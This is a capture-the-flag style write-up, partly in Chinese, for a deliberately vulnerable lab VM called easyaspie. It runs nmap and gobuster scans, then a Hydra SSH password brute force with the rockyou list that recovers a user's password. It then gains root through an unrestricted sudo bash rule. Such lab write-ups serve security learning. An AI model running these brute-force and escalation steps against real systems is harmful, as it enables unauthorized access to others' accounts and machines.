---
title: "VulnVM-easyaspie"
date: 2025-04-19
categories: 
  - "vulnvm"
tags: 
  - "linux"
  - "vulnvm"
---

## Box Info

| OS | Linux |
| --- | --- |
| Difficulty | Easy |

## Nmap

```
[root@kali] /home/kali/homelab  
❯ nmap 192.168.56.156 -sV -A -p-

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8c:c5:70:a6:8f:7c:53:6f:98:6d:01:9c:63:b7:3b:60 (RSA)
|   256 31:1f:74:73:32:ff:8e:f0:f9:63:fb:51:13:98:32:27 (ECDSA)
|_  256 7e:1f:ea:1b:50:38:d8:88:5a:fc:cb:6f:70:3f:25:0b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

## Gobuster

```
[root@kali] /home/kali/homelab  
❯ gobuster dir -u http://192.168.56.156/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,txt -t 50                    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.156/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/note.txt             (Status: 200) [Size: 162]
/server-status        (Status: 403) [Size: 279]
Progress: 661680 / 661683 (100.00%)
===============================================================
```

查看**/note.txt**

```
#http://192.168.56.156/note.txt
Hi Alex,

I wanted to inform you that Iâ€™ve changed your password. Please let me know if you need the new details or if you encounter any issues.

Best regards!
```

## Hydra

尝试爆破**ssh**

```
[root@kali] /home/kali/homelab  
❯ hydra -l alex -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.156 -I                                                        ⏎
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-19 11:10:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ssh://192.168.56.156:22/
[22][ssh] host: 192.168.56.156   login: alex   password: princess1
1 of 1 target successfully completed, 1 valid password found
```

得到密码是：**princess1**

## Root

```
alex@easyaspie:~$ sudo -l
Matching Defaults entries for alex on easyaspie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on easyaspie:
    (ALL) NOPASSWD: /bin/bash
```

直接开启bash就行了

```
alex@easyaspie:~$ sudo /bin/bash
root@easyaspie:/home/alex# whoami
root
root@easyaspie:/home/alex# 
```

## Summary

毫无营养的一个靶机，居然还有4个G的大小，结果就整这种玩意，浪费时间。
